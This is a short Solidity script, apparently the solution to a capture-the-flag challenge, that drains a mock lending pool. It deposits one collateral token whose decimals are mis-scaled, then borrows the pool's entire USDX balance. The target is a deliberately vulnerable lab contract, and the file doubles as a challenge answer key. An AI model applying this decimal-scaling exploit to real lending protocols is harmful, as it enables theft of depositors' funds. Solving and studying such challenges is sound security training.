// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C6Scale.sol";

/// Deposit one $1 token; the 1e10 decimals mis-scale values it as a fortune.
contract SolveC6 is Script {
    function run() external {
        ScaleSetup setup = ScaleSetup(vm.envAddress("SETUP"));
        MockERC20 collateral = setup.collateral();
        MockERC20 usdx = setup.usdx();
        ScaleLending lending = setup.lending();

        vm.startBroadcast();
        collateral.approve(address(lending), type(uint256).max);
        lending.deposit(1 ether);
        lending.borrow(usdx.balanceOf(address(lending)));
        vm.stopBroadcast();
    }
}
